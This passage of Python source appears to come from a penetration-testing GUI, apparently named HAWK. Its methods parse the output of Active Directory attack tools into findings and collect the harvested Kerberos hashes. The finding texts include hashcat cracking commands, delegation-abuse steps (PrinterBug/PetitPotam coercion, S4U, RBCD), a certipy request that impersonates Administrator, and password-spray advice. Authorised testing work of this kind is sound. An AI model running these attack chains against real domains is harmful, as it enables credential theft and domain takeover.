                    # Roasted TGS, still encrypted — not a login.
                    verified=False))
                added += 1
            except Exception as e:
                print(f"[HAWK] kerberoast cred push failed: {e}")

        # Clock skew aborts the TGS request (KRB_AP_ERR_SKEW): GetUserSPNs
        # still LISTS the SPN accounts over LDAP but retrieves no hash.
        skew = ("krb_ap_err_skew" in joined or "clock skew" in joined)

        # Summary finding
        desc_parts = [
            f"Kerberoast enumeration on {target}.",
            "",
            f"  SPN users found : {len(users_found)}",
            f"  TGS hashes      : {len(hashes)}",
        ]
        if users_found:
            desc_parts += ["", "Users with SPNs:"]
            for u in users_found[:20]:
                desc_parts.append(f"  · {u}")
            if len(users_found) > 20:
                desc_parts.append(f"  · … {len(users_found)-20} more")
        if added:
            desc_parts += ["", (f"→ {added} TGS hash(es) added to "
                                f"Credential Store (hashcat -m 13100).")]
        if users_found and not hashes and skew:
            desc_parts += [
                "",
                "NOTE: SPN accounts found but NO TGS hash retrieved — the "
                "ticket request failed with KRB_AP_ERR_SKEW (clock skew).",
                "Kerberos compares UTC and is timezone-independent; your "
                "clock is simply >5 min off the DC's.  Sync to the DC and "
                "re-run to roast them:",
                f"  sudo ntpdate -u {target}   (or: sudo rdate -n {target})"]

        # Finding severity: a kerberoastable service account is a high-value
        # foothold whether or not we grabbed the hash this run, so raise it
        # to 'high' as soon as any SPN user is found.  It was 'info' when no
        # hash — combined with the row-regex bug that dropped the users,
        # every skewed run read as a low-priority generic finding.
        sev = "high" if (hashes or users_found) else "info"
        title = (f"KERBEROAST — {len(hashes)} TGS hash(es) on "
                 f"{target}" if hashes else
                 f"KERBEROAST — {len(users_found)} SPN user(s) on "
                 f"{target}")
        self.app.after(0, lambda: self.app.target_intel.add_auto_finding(
            title=title, description="\n".join(desc_parts),
            severity=sev, source=tool.name,
            linked_run_id=rid, replace=True))
        self.app.terminal.write(
            f"  [+] Kerberoast — {added} TGS hash(es) → Credential "
            f"Store.", "success")
        return True

    def _parse_asrep_to_intel(self, tool, log: list) -> bool:
        """GetNPUsers / AS-REP Roast output parser."""
        import os, re
        from utils.session import Credential
        from utils.run_id import new_run_id, TOOL_RUN_CATEGORY

        target = self._get_target() or "target"
        rid = new_run_id()
        lines = [self._strip_ansi(ln) for _, ln in log]

        ASREP_RE = re.compile(r"^(\$krb5asrep\$[^\s]+)$")
        hashes = []
        for ln in lines:
            m = ASREP_RE.match(ln.strip())
            if m:
                hashes.append(m.group(1))

        # -outputfile fallback
        outpath = None
        for ln in lines:
            m = re.search(r"-outputfile\s+(\S+)", ln)
            if m:
                outpath = os.path.expanduser(m.group(1))
                break
        if not outpath:
            from utils.config import OUTPUTS_DIR as _OUTDIR
            outpath = os.path.join(_OUTDIR, f"asrep-{target}.txt")
        if os.path.isfile(outpath):
            try:
                with open(outpath, "r", encoding="utf-8",
                          errors="replace") as f:
                    for ln in f:
                        m = ASREP_RE.match(ln.strip())
                        if m and m.group(1) not in hashes:
                            hashes.append(m.group(1))
            except Exception:
                pass

        if not hashes:
            # Multiple valid negative-result signatures for
            # GetNPUsers.  Count each so the user gets concrete
            # numbers instead of "something went wrong".
            joined_low = "\n".join(lines).lower()
            neg_preauth = any("UF_DONT_REQUIRE_PREAUTH" in ln
                              for ln in lines)
            no_entries = "no entries found" in joined_low
            n_unknown = joined_low.count(
                "kdc_err_c_principal_unknown")
            # KDC_ERR_CLIENT_REVOKED means the account EXISTS in the
            # domain but is disabled / password-expired / locked.
            # This is a positive enumeration signal — real
            # usernames leaked through.  Similar story for
            # KDC_ERR_CLIENT_NOT_TRUSTED.
            n_revoked = (joined_low.count("kdc_err_client_revoked")
                         + joined_low.count(
                             "kdc_err_client_not_trusted"))
            n_policy = joined_low.count("kdc_err_policy")
            valid_existing = n_revoked + n_policy

            if not (neg_preauth or no_entries or n_unknown
                    or valid_existing):
                return False

            # Build a concrete, counted explanation.
            parts = []
            if neg_preauth:
                parts.append(
                    "Some users DO exist and were reached, but all "
                    "of them have 'Do not require preauth' cleared "
                    "— AS-REP is not obtainable for them.")
            if no_entries:
                parts.append(
                    "Server returned 'No entries found' — the user "
                    "source didn't match anything preauth-disabled.")
            if n_unknown:
                parts.append(
                    f"{n_unknown} username(s) returned "
                    f"KDC_ERR_C_PRINCIPAL_UNKNOWN — they don't "
                    f"exist in this domain (typos / wrong wordlist).")
            if valid_existing:
                parts.append(
                    f"✨  {valid_existing} username(s) returned "
                    f"KDC_ERR_CLIENT_REVOKED / POLICY — THEY DO "
                    f"EXIST in the domain (just disabled / expired / "
                    f"locked).  This is a positive enumeration "
                    f"leak: real account names are in your wordlist.")

            next_moves = (
                "Next moves:\n"
                "  · KERBRUTE USERENUM — same wordlist, extracts "
                "every VALID username (-debug in GetNPUsers would "
                "also print which one triggered each error, but "
                "kerbrute is cleaner)\n"
                "  · KERBEROAST — may still yield SPN-bound "
                "service-account hashes\n"
                "  · BloodHound — graph-based privesc paths\n"
                "  · Password spray — feed the valid usernames "
                "from kerbrute to spray a common seasonal pwd")

            # Severity bumps when we confirmed real user existence,
            # even without hashes.
            sev = "low" if valid_existing else "info"
            title = (
                f"AS-REP ROAST — no hashes, but "
                f"{valid_existing} user(s) confirmed on {target}"
                if valid_existing else
                f"AS-REP ROAST — no hashes obtained on {target}")

            self.app.after(0, lambda:
                self.app.target_intel.add_auto_finding(
                    title=title,
                    description="\n\n".join(parts) + "\n\n"
                                 + next_moves,
                    severity=sev, source=tool.name,
                    linked_run_id=rid))
            self.app.terminal.write(
                f"  [i] AS-REP roast — {n_unknown} unknown, "
                f"{valid_existing} confirmed-existing, "
                f"0 hashes.  See Target Intel for next moves.",
                "info" if not valid_existing else "success")
            return True

        added = 0
        roasted_users = []
        for h in hashes:
            user_m = re.search(r"\$([^@\$]+)@", h)
            user = user_m.group(1) if user_m else "asrep-user"
            roasted_users.append(user)
            try:
                self.app.cred_store.add_credential(Credential(
                    username=user,
                    password="",
                    cred_type="hash",
                    hash_val=h,
                    hash_type="Kerberos AS-REP",
                    services=["AD", "Kerberos"],
                    source_phase=self.phase_id,
                    host=target,
                    notes=(f"AS-REP hash from GetNPUsers on {target}.\n"
                           f"Crack:  hashcat -m 18200 <hash> rockyou.txt\n"
                           f"User has DONT_REQ_PREAUTH flag — no "
                           f"password needed to request the TGT."),
                    linked_run_id=rid,
                    category=TOOL_RUN_CATEGORY,
                    # AS-REP blob to crack offline — not a login.
                    verified=False))
                added += 1
            except Exception as e:
                print(f"[HAWK] asrep cred push failed: {e}")

        roasted_users = list(dict.fromkeys(roasted_users))
        _asrep_desc = [
            f"GetNPUsers found {len(hashes)} user(s) with 'Do not require "
            f"pre-authentication' set — their AS-REP is retrievable "
            f"without the account's password.",
            "",
            f"→ {added} hash(es) added to Credential Store "
            f"(hashcat -m 18200).  Cracked result = the user's domain "
            f"password.",
        ]
        if roasted_users:
            _asrep_desc += ["", "AS-REP roastable users:"]
            for u in roasted_users[:20]:
                _asrep_desc.append(f"  · {u}")
            if len(roasted_users) > 20:
                _asrep_desc.append(f"  · … {len(roasted_users)-20} more")
        self.app.after(0, lambda: self.app.target_intel.add_auto_finding(
            title=f"AS-REP ROAST — {len(hashes)} hash(es) on {target}",
            description="\n".join(_asrep_desc),
            severity="high", source=tool.name,
            linked_run_id=rid, replace=True))
        self.app.terminal.write(
            f"  [+] AS-REP Roast — {added} hash(es) → Credential Store.",
            "success")
        return True

    def _parse_findelegation_to_intel(self, tool, log: list) -> bool:
        """impacket-findDelegation parser.

        Table (2+-space aligned columns; DelegationType is multi-word):
          AccountName  AccountType  DelegationType  DelegationRightsTo  SPN Exists

        Without this the generic fallback dumped the raw table at severity
        'info' — but delegation (unconstrained / constrained / RBCD) is a
        real privilege-escalation vector, so it deserves a structured
        high-severity finding that names each account, its delegation
        type, and the target SPN.
        """
        import re
        from utils.run_id import new_run_id

        target = self._get_target() or "target"
        rid = new_run_id()
        lines = [self._strip_ansi(ln) for _, ln in log]

        rows = []
        for ln in lines:
            st = ln.strip()
            if (not st or st.startswith("Impacket")
                    or st.startswith("AccountName")
                    or set(st) <= set("- ")):
                continue
            cols = re.split(r"\s{2,}", st)
            # A data row: col[1] is the account type.
            if len(cols) >= 3 and cols[1] in (
                    "Computer", "Person", "User", "Group"):
                name   = cols[0].strip()
                atype  = cols[1].strip()
                dtype  = cols[2].strip()
                rights = cols[3].strip() if len(cols) > 3 else ""
                rows.append((name, atype, dtype, rights))

        if not rows:
            low = "\n".join(lines).lower()
            if "no entries found" in low or "findelegation" in low:
                self.app.after(0, lambda:
                    self.app.target_intel.add_auto_finding(
                        title=f"FIND DELEGATION — none on {target}",
                        description=(
                            "impacket-findDelegation queried the DC "
                            "successfully but no account has "
                            "unconstrained / constrained / RBCD "
                            "delegation rights.  Nothing to abuse here."),
                        severity="info", source=tool.name,
                        linked_run_id=rid, replace=True))
                return True
            return False

        lo = lambda s: s.lower()
        unconstrained = [r for r in rows if "unconstrained" in lo(r[2])]
        constrained   = [r for r in rows
                         if "constrained" in lo(r[2])
                         and "unconstrained" not in lo(r[2])
                         and "resource" not in lo(r[2])]
        rbcd          = [r for r in rows if "resource" in lo(r[2])]

        desc = [f"Delegation enumeration on {target} — "
                f"{len(rows)} account(s) with delegation rights.", ""]
        for name, atype, dtype, rights in rows:
            line = f"  · {name} ({atype}) — {dtype}"
            if rights and rights.upper() != "N/A":
                line += f"  →  {rights}"
            desc.append(line)
        desc += ["", "Why it matters:"]
        if unconstrained:
            desc.append(
                "  · Unconstrained — the account caches the TGT of ANY "
                "principal that authenticates to it; coerce a DC to auth "
                "(PrinterBug / PetitPotam) and capture a Domain Admin "
                "TGT.  NOTE: a DC is ALWAYS unconstrained, so verify "
                "whether the listed account is the DC (expected) or a "
                "member host (full compromise).")
        if constrained:
            desc.append(
                "  · Constrained — abuse S4U2Self + S4U2Proxy to "
                "impersonate any user to the listed SPN service "
                "(CIFS → file shares, HTTP → WinRM, LDAP → DCSync).")
        if rbcd:
            desc.append(
                "  · Resource-Based (RBCD) — write "
                "msDS-AllowedToActOnBehalfOfOtherIdentity, then S4U "
                "into the target computer as any user.")

        self.app.after(0, lambda:
            self.app.target_intel.add_auto_finding(
                title=f"FIND DELEGATION — {len(rows)} delegated "
                      f"account(s) on {target}",
                description="\n".join(desc),
                severity="high", source=tool.name,
                linked_run_id=rid, replace=True))
        self.app.terminal.write(
            f"  [+] FIND DELEGATION — {len(rows)} delegated account(s) "
            f"→ Target Intel.", "success")
        return True

    def _parse_certipy_find_to_intel(self, tool, log: list) -> bool:
        """Certipy find output parser — surface every 'Vulnerable to:
        ESCx' with the CA + template context."""
        import re
        from utils.run_id import new_run_id

        target = self._get_target() or "target"
        rid = new_run_id()
        text = "\n".join(self._strip_ansi(ln) for _, ln in log)

        # certipy blocks look like:
        #     Template Name              : Domain Users
        #     Enabled                    : True
        #     ...
        #     Permissions
        #       Enrollment Permissions
        #         ...
        #       [!] Vulnerabilities
        #         ESC1                   : 'Domain Users' can enroll...
        TEMPLATE_BLOCKS = re.findall(
            r"Template Name\s*:\s*([^\n]+)[\s\S]*?"
            r"(?:ESC\d+\s*:\s*[^\n]+(?:\n|$))+",
            text)
        vulns = []
        # Parse per-ESC match
        ESC_RE = re.compile(r"(ESC\d+)\s*:\s*([^\n]+)")
        # Also grab CA name(s) — often at top
        ca_m = re.search(r"CA Name\s*:\s*([^\n]+)", text)
        ca_name = ca_m.group(1).strip() if ca_m else "<CA>"

        for block in re.finditer(
                r"Template Name\s*:\s*([^\n]+)"
                r"(?:(?!Template Name).)*?"
                r"(?=(?:Template Name|$))",
                text, re.DOTALL):
            tmpl_name = block.group(1).strip()
            block_text = block.group(0)
            for em in ESC_RE.finditer(block_text):
                vulns.append((tmpl_name, em.group(1), em.group(2).strip()))

        if not vulns:
            # ── Path A: AD CS enumerated successfully, no ESC vulns ──
            if "Enterprise CA" in text or "Certificate Authorities" in text:
                self.app.after(0, lambda:
                    self.app.target_intel.add_auto_finding(
                        title=f"CERTIPY FIND — AD CS on {target} "
                              f"(no ESC vulns found)",
                        description=(
                            f"Certipy enumerated AD CS on {target} but "
                            f"found no exploitable ESC1–ESC11 "
                            f"misconfiguration.  CA name: {ca_name}"),
                        severity="info", source=tool.name,
                        linked_run_id=rid))
                return True

            # ── Path B: common failure-mode diagnostics ──────────────
            # Certipy never reached the enumeration phase — classify
            # the error so the user knows WHY and what to try next.
            # Each branch returns True so the generic "completed,
            # no findings" fallback doesn't fire and confuse the user.
            text_low = text.lower()

            # B1: LDAPS connection reset (socket ssl wrapping error).
            # Most common on targets without AD CS installed, or with
            # LDAPS disabled / misconfigured cert.  Metasploitable3,
            # plain DCs without the CS role, old Server 2008 boxes.
            if ("socket ssl wrapping error" in text_low
                    or "connection reset by peer" in text_low
                    or "ssl: unexpected_eof" in text_low):
                self.app.after(0, lambda:
                    self.app.target_intel.add_auto_finding(
                        title=f"CERTIPY FIND — LDAPS unreachable on "
                              f"{target}",
                        description=(
                            "Certipy tried to bind over LDAPS (636/tcp) "
                            "but the connection reset before the TLS "
                            "handshake completed.  Usually this means:\n"
                            "  · AD CS (Active Directory Certificate "
                            "Services) is NOT installed on the DC → "
                            "nothing for certipy to enumerate\n"
                            "  · LDAPS is running without a valid "
                            "certificate → TLS fails\n"
                            "  · 636/tcp is firewalled; only 389 "
                            "(LDAP without TLS) is exposed\n\n"
                            "Next moves:\n"
                            "  · Check if 636/tcp is actually open — "
                            "nmap -p 636 <target>\n"
                            "  · Run  nxc ldap <target> -u <u> -p <p> "
                            "--adcs  — uses plain LDAP (389) to probe "
                            "CS presence without TLS\n"
                            "  · If no AD CS is installed, skip the "
                            "certipy chain entirely and pivot to "
                            "BLOODHOUND + kerberoast for privesc\n"
                            "  · Force LDAP (no TLS) via certipy "
                            "-scheme ldap  (supported in recent "
                            "versions)"),
                        severity="info", source=tool.name,
                        linked_run_id=rid))
                self.app.terminal.write(
                    "  [i] certipy — LDAPS unreachable.  Target "
                    "probably has no AD CS role.", "info")
                return True

            # B2: authentication failed.
            if ("kdc_err_c_principal_unknown" in text_low
                    or "logon_failure" in text_low
                    or "invalidcredentials" in text_low
                    or "authentication failed" in text_low):
                self.app.after(0, lambda:
                    self.app.target_intel.add_auto_finding(
                        title=f"CERTIPY FIND — auth failed on {target}",
                        description=(
                            "Certipy could not authenticate against "
                            "the DC.  Typical causes:\n"
                            "  · Username doesn't exist in the domain "
                            "(typo, wrong @REALM)\n"
                            "  · Wrong password / NTLM hash\n"
                            "  · Account locked out from earlier "
                            "brute-force (wait the lockout window)\n"
                            "  · Time skew > 5 minutes between Kali "
                            "and DC — Kerberos refuses to issue "
                            "tickets.  Run  sudo ntpdate <DC-IP>\n\n"
                            "Verify creds first with:  nxc smb "
                            "<target> -u <u> -p <p>  — the shortest "
                            "possible auth round-trip."),
                        severity="info", source=tool.name,
                        linked_run_id=rid))
                self.app.terminal.write(
                    "  [i] certipy — auth failed; verify creds with "
                    "'nxc smb <target> -u ... -p ...'.", "info")
                return True

            # B3: no CAs found (AD CS ran but empty).
            if ("could not find any certificate authorities"
                    in text_low
                    or "no certificate authorities" in text_low):
                self.app.after(0, lambda:
                    self.app.target_intel.add_auto_finding(
                        title=f"CERTIPY FIND — no CAs on {target}",
                        description=(
                            "Certipy queried AD CS successfully but "
                            "the domain has no Enterprise CA "
                            "registered.  AD CS role may be in a "
                            "partial install state.  Nothing to "
                            "attack in the certificate chain here."),
                        severity="info", source=tool.name,
                        linked_run_id=rid))
                return True

            # B4: generic DCERPC / ICPR endpoint failures — certipy
            # got past LDAP but the ICPR RPC call dropped.
            if ("dcerpc" in text_low and "fail" in text_low) \
                    or "icpr" in text_low:
                self.app.after(0, lambda:
                    self.app.target_intel.add_auto_finding(
                        title=f"CERTIPY FIND — RPC/ICPR error on "
                              f"{target}",
                        description=(
                            "Certipy's RPC call to the Certificate "
                            "Services endpoint (ICPR) failed.  "
                            "Usually a network-path issue or CS "
                            "service stopped on the server.  Try "
                            "again in a minute; if it persists the "
                            "CS role is probably uninstalled."),
                        severity="info", source=tool.name,
                        linked_run_id=rid))
                return True

            # No known signature — let the generic fallback handle it.
            return False

        # One finding per vuln, all sharing the run_id
        # (use a single summary finding + detail list — easier UX)
        desc = [
            f"Certipy found {len(vulns)} AD CS misconfiguration(s) "
            f"on {target}.",
            f"",
            f"CA Name: {ca_name}",
            f"",
            "Vulnerable templates:",
        ]
        for tmpl, esc, note in vulns[:20]:
            desc.append(f"  · {esc:<6}  {tmpl!r:<30}  {note[:80]}")
        if len(vulns) > 20:
            desc.append(f"  · … {len(vulns) - 20} more")
        desc += ["", "Next step — request a cert for Administrator:",
                 f"  certipy req -u <user>@<domain> -p <pass> "
                 f"-target {target} \\",
                 f"    -ca {ca_name!r} -template '<template>' \\",
                 f"    -upn Administrator@<domain> "
                 f"-out <HAWK>/outputs/esc"]

        esc_names = sorted({v[1] for v in vulns})
        title = (f"CERTIPY FIND — AD CS vulnerable on {target}  "
                 f"({', '.join(esc_names)})")
        self.app.after(0, lambda: self.app.target_intel.add_auto_finding(
            title=title, description="\n".join(desc),
            severity="critical", source=tool.name,
            linked_run_id=rid))
        self.app.terminal.write(
            f"  [+] Certipy — {len(vulns)} ESC vuln(s) → Target Intel.",
            "success")
        return True

    def _parse_bloodhound_to_intel(self, tool, log: list) -> bool:
        """bloodhound-python ZIP parser — extracts the .zip produced
        in the session-scoped output dir (set up by _run_raw), reads
        each JSON, surfaces interesting user / computer flags as
        findings, pushes discovered users to the session."""
        import os, re, json as _json, zipfile, glob, tempfile, shutil
        from utils.run_id import new_run_id

        target = self._get_target() or "target"
        rid = new_run_id()
        lines = [self._strip_ansi(ln) for _, ln in log]
        text = "\n".join(lines)

        # Find the latest bloodhound ZIP.  _run_raw pre-creates a
        # per-run dir under sessions/<sid>/bloodhound/<target>_<rid>/
        # and runs bloodhound-python with cwd=that_dir, so the file
        # `YYYYMMDDHHMMSS_bloodhound.zip` lands there.  We read that
        # dir from the tool widget; if for any reason it isn't set
        # (older session, setup failed) we fall back to globbing the
        # process cwd to preserve legacy behavior.
        run_cwd = (self._tool_widgets.get(tool.id) or {}).get("_cwd")
        search_dirs = []
        if run_cwd and os.path.isdir(run_cwd):
            search_dirs.append(run_cwd)
        search_dirs.append(".")  # always also try cwd as a fallback
        candidates = []
        for d in search_dirs:
            candidates += glob.glob(os.path.join(d, "*bloodhound.zip"))
            candidates += glob.glob(os.path.join(d, "*_bloodhound.zip"))
        candidates = sorted(set(candidates),
                            key=lambda p: os.path.getmtime(p), reverse=True)
        zip_path = candidates[0] if candidates else None
        if not zip_path or not os.path.isfile(zip_path):
            # No zip found — fall back to parsing the stdout summary
            # lines (INFO: Found X users, etc.).
            m = re.findall(r"INFO: Found (\d+) (users|groups|computers|"
                            r"domains|gpos|ous|containers|trusts)", text)
            if not m:
                return False
            counts = {k: int(n) for n, k in m}
            desc = [
                f"BloodHound collection on {target}.",
                "",
            ] + [f"  {k:<12} {v}" for k, v in counts.items()]
            desc += ["",
                     "ZIP file not found in cwd — open the .zip with "
                     "BloodHound GUI manually to explore the graph."]
            self.app.after(0, lambda:
                self.app.target_intel.add_auto_finding(
                    title=f"BLOODHOUND (collect) — {target}",
                    description="\n".join(desc),
                    severity="info", source=tool.name,
                    linked_run_id=rid, replace=True))
            return True

        # Extract + parse
        os.makedirs(TMP_DIR, exist_ok=True)
        tmp = tempfile.mkdtemp(prefix="hawk_bloodhound_", dir=TMP_DIR)
        try:
            with zipfile.ZipFile(zip_path, "r") as z:
                z.extractall(tmp)
            users_data = {}
            computers_data = {}
            groups_data = {}
            for fn in os.listdir(tmp):
                if fn.endswith("_users.json"):
                    users_data = _json.load(open(
                        os.path.join(tmp, fn), "r", encoding="utf-8"))
                elif fn.endswith("_computers.json"):
                    computers_data = _json.load(open(
                        os.path.join(tmp, fn), "r", encoding="utf-8"))
                elif fn.endswith("_groups.json"):
                    groups_data = _json.load(open(
                        os.path.join(tmp, fn), "r", encoding="utf-8"))
        finally:
            try:
                shutil.rmtree(tmp)
            except Exception:
                pass

        users = users_data.get("data") or users_data.get("users") or []
        computers = (computers_data.get("data") or
                     computers_data.get("computers") or [])
        groups = groups_data.get("data") or groups_data.get("groups") or []

        # Collect stats for the summary finding (pure helper — unit-tested
        # in tests/test_bloodhound_parser.py).  Excludes krbtgt/disabled
        # accounts from the kerberoast list and resolves Domain/Enterprise
        # Admins members to display names.
        stats_x = _bloodhound_extract_stats(users, computers, groups)
        user_names        = stats_x["user_names"]
        kerberoastable    = stats_x["kerberoastable"]
        asrepable         = stats_x["asrepable"]
        unconstrained_pcs = stats_x["unconstrained_pcs"]
        da_members        = stats_x["da_members"]

        # Push discovered users to the session
        try:
            sess = self.app.session_manager.current
            if sess and user_names:
                sess.add_discovered_users(user_names)
        except Exception:
            pass

        # Target Intel summary
        desc = [
            f"BloodHound collection on {target}.",
            f"",
            f"  Users       : {len(users)}",
            f"  Computers   : {len(computers)}",
            f"  Groups      : {len(groups)}",
            f"",
            f"  Kerberoastable (SPN)        : {len(kerberoastable)}",
            f"  AS-REP roastable (no preauth): {len(asrepable)}",
            f"  Unconstrained delegation PCs: {len(unconstrained_pcs)}",
            f"  Domain/Enterprise Admins    : {len(da_members)}",
            f"",
            f"Zip: {zip_path}",
            f"",
            f"BloodHound GUI (not embedded — install BH CE separately:",
            f"github.com/SpecterOps/BloodHound) → ingest this ZIP via",
            f"Administration → File Ingest → run 'Shortest Path to",
            f"Domain Admins' / 'Shortest Path from Owned' for attack",
            f"paths the linear output cannot show.",
        ]
        if kerberoastable:
            desc += ["", "Kerberoastable users (run KERBEROAST next):"]
            for n in kerberoastable[:10]:
                desc.append(f"  · {n}")
        if asrepable:
            desc += ["",
                     "AS-REP roastable (run AS-REP ROAST with these users):"]
            for n in asrepable[:10]:
                desc.append(f"  · {n}")
        if unconstrained_pcs:
            desc += ["", "Computers with unconstrained delegation "
                         "(goldmine for privesc):"]
            for n in unconstrained_pcs[:10]:
                desc.append(f"  · {n}")
        if da_members:
            desc += ["", "Domain / Enterprise Admins "
                         "(crown jewels — target these):"]
            for n in da_members[:10]:
                desc.append(f"  · {n}")

        sev = ("critical" if unconstrained_pcs or kerberoastable
               else ("medium" if asrepable else "info"))
        # replace=True: bloodhound is a snapshot tool — every run is a
        # full re-collection, so a re-run must OVERWRITE the finding's
        # description, not append a diff onto the stale one (which
        # produced a self-contradicting card: "Kerberoastable 1 / KRBTGT"
        # from run #1 stacked above "Kerberoastable 0" from run #2).
        self.app.after(0, lambda: self.app.target_intel.add_auto_finding(
            title=f"BLOODHOUND — {len(users)} users, "
                  f"{len(computers)} computers on {target}",
            description="\n".join(desc),
            severity=sev, source=tool.name,
            linked_run_id=rid, replace=True))
        self.app.terminal.write(
            f"  [+] BloodHound — parsed ZIP: {len(users)} users, "
            f"{len(kerberoastable)} kerberoastable, "
            f"{len(asrepable)} asrepable, "
            f"{len(unconstrained_pcs)} UNC delegation.", "success")

        # Pop the post-collect summary dialog with the native attack
        # graph.  Scheduled via app.after so it lands on the Tk main
        # thread (the parser runs in the runner's done-callback
        # context).  Wrapped in try/except so a dialog failure never
        # breaks the parse path.
        #
        # graph_data is built via utils.bloodhound_graph — same .zip,
        # richer extraction (edges + per-node categories + click-popup
        # details).  Kept separate from `stats` so the existing summary
        # counters keep rendering fast even for large graphs.
        try:
            from gui.dialogs import show_bloodhound_summary_dialog
            from utils.bloodhound_graph import build_graph_data
            stats = {
                "users":          len(users),
                "computers":      len(computers),
                "groups":         len(groups),
                "kerberoastable": len(kerberoastable),
                "asrepable":      len(asrepable),
                "unconstrained":  len(unconstrained_pcs),
                "da_members":     len(da_members),
            }
            try:
                graph_data = build_graph_data(zip_path)
            except Exception as ge:
                print(f"[HAWK] build_graph_data failed: {ge}")
                graph_data = None
            # on_run_tool = bound method of this CardWidget.  When the
            # user clicks a "RUN IN <tool>" button in the graph side
            # panel, the graph window calls back into us with
            # (tool_id, prefill_dict) and we dispatch to the right
            # _route_* method.  Bind here (not inside lambda) so the
            # reference survives as long as the graph window is open.
            self.app.after(
                0,
                lambda: show_bloodhound_summary_dialog(
                    self.app, target, stats, zip_path,
                    graph_data=graph_data,
                    on_run_tool=self.launch_tool_prefilled))
        except Exception as e:
            print(f"[HAWK] BloodHound summary dialog failed: {e}")

        return True

    def _parse_adidnsdump_to_intel(self, tool, log: list) -> bool:
        """adidnsdump CSV parser — pushes every host → IP mapping as a
        Target Intel finding (new hosts you might not have scanned)."""
        import os, csv, re
        from utils.run_id import new_run_id

        target = self._get_target() or "target"
        rid = new_run_id()

        # adidnsdump writes records.csv in cwd
        csv_path = None
        for p in ("records.csv", "./records.csv"):
            if os.path.isfile(p):
                csv_path = p
                break
        records = []
        if csv_path:
            try:
                with open(csv_path, "r", encoding="utf-8",
                          errors="replace") as f:
                    reader = csv.reader(f)
                    for row in reader:
                        if len(row) >= 3:
                            records.append(tuple(row[:3]))
            except Exception as e:
                print(f"[HAWK] adidnsdump csv parse failed: {e}")

        # adidnsdump writes a header row (type,name,value in some order).
        # Drop it so the count matches adidnsdump's own "Found N records"
        # tally and the table doesn't render a header pseudo-row; use the
        # header to map columns robustly across adidnsdump versions.
        col = {"type": 0, "name": 1, "value": 2}   # canonical order
        if records and {c.strip().lower() for c in records[0]} == {
                "type", "name", "value"}:
            hdr = [c.strip().lower() for c in records[0]]
            col = {k: hdr.index(k) for k in ("type", "name", "value")}
            records = records[1:]

        if not records:
            # Fall back to stdout count
            text = "\n".join(self._strip_ansi(ln) for _, ln in log)
            m = re.search(r"Found (\d+) records", text)
            if not m:
                return False
            self.app.after(0, lambda:
                self.app.target_intel.add_auto_finding(
                    title=f"ADIDNSDUMP — {m.group(1)} DNS records on "
                          f"{target}",
                    description=(f"adidnsdump listed {m.group(1)} DNS "
                                 f"records from the AD-integrated DNS "
                                 f"zone on {target}.  CSV file not "
                                 f"found in cwd — rerun to capture."),
                    severity="info", source=tool.name,
                    linked_run_id=rid))
            return True

        desc = [
            f"ADIDNSDUMP — full AD DNS zone on {target}.",
            "",
            f"Records: {len(records)}"
            + ("  (first 40 shown)" if len(records) > 40 else ""),
            "",
            f"  {'NAME':<28} {'TYPE':<5} VALUE",
        ]
        for row in records[:40]:
            if len(row) >= 3:
                desc.append(
                    f"  {row[col['name']]:<28} "
                    f"{row[col['type']]:<5} {row[col['value']]}")
        if len(records) > 40:
            desc.append(f"  … {len(records)-40} more in records.csv")
        desc += ["",
                 "Records shown as '?' have their value hidden in LDAP — "
                 "re-run with the -r chip to resolve them via a live DNS "
                 "query.",
                 "",
                 "Extract useful hosts from this list and add them to "
                 "your scan scope — every A record is a potential pivot."]

        # Snapshot semantics: each run reports the CURRENT full zone, so a
        # stable title (no volatile record count) + replace=True refreshes
        # the single finding instead of stacking a new card per run.
        self.app.after(0, lambda: self.app.target_intel.add_auto_finding(
            title=f"ADIDNSDUMP — AD DNS zone on {target}",
            description="\n".join(desc),
            severity="info", source=tool.name,
            linked_run_id=rid, replace=True))
        self.app.terminal.write(
            f"  [+] adidnsdump — {len(records)} records → Target Intel.",
            "success")
        return True

    def _parse_ldapdomaindump_to_intel(self, tool, log: list) -> bool:
        """ldapdomaindump output parser — reads the generated
        domain_users.grep / domain_computers.grep files."""
        import os, re
        from utils.run_id import new_run_id

        target = self._get_target() or "target"
        rid = new_run_id()
        text = "\n".join(self._strip_ansi(ln) for _, ln in log)

        # Find the output directory from the -o flag or default
        from utils.config import OUTPUTS_DIR as _OUTDIR
        outdir_m = re.search(r"-o\s+(\S+)", text)
        outdir = (os.path.expanduser(outdir_m.group(1))
                  if outdir_m
                  else os.path.join(_OUTDIR,
                                     f"ldapdump-{target}"))

        users = []
        computers = []
        if os.path.isdir(outdir):
            for fn in ("domain_users.grep",):
                p = os.path.join(outdir, fn)
                if os.path.isfile(p):
                    try:
                        with open(p, "r", encoding="utf-8",
                                  errors="replace") as f:
                            for ln in f:
                                parts = ln.strip().split("\t")
                                if parts and parts[0] not in ("cn",
                                                               "CN"):
                                    users.append(parts[0])
                    except Exception:
                        pass
            for fn in ("domain_computers.grep",):
                p = os.path.join(outdir, fn)
                if os.path.isfile(p):
                    try:
                        with open(p, "r", encoding="utf-8",
                                  errors="replace") as f:
                            for ln in f:
                                parts = ln.strip().split("\t")
                                if parts and parts[0] not in ("cn",
                                                               "CN"):
                                    computers.append(parts[0])
                    except Exception:
                        pass

        if not users and not computers:
            return False

        try:
            sess = self.app.session_manager.current
            if sess and users:
                sess.add_discovered_users(users)
        except Exception:
            pass

        desc = [
            f"LDAPDOMAINDUMP — domain enumeration on {target}.",
            "",
            f"  Users     : {len(users)}",
            f"  Computers : {len(computers)}",
            "",
        ]
        if users:
            desc += ["Users (first 20):"]
            for u in users[:20]:
                desc.append(f"  · {u}")
            if len(users) > 20:
                desc.append(f"  · … {len(users)-20} more")
        if computers:
            desc += ["", "Computers (first 20):"]
            for c in computers[:20]:
                desc.append(f"  · {c}")
            if len(computers) > 20:
                desc.append(f"  · … {len(computers)-20} more")
        desc += ["",
                 f"Full output: {outdir}/domain_users.html + *.json + "
                 f"*.grep — open domain_users.html in a browser."]

        # replace=True: ldapdomaindump is a snapshot tool (a re-run is a
        # full re-dump), so overwrite the finding instead of appending a
        # diff onto the stale one — same reasoning as bloodhound.
        self.app.after(0, lambda: self.app.target_intel.add_auto_finding(
            title=f"LDAPDOMAINDUMP — {len(users)} users / "
                  f"{len(computers)} computers on {target}",
            description="\n".join(desc),
            severity="info", source=tool.name,
            linked_run_id=rid, replace=True))
        self.app.terminal.write(
            f"  [+] ldapdomaindump — {len(users)} users, "
            f"{len(computers)} computers → Target Intel.", "success")
        return True

    def _parse_nxc_ldap_to_intel(self, tool, log: list) -> bool:
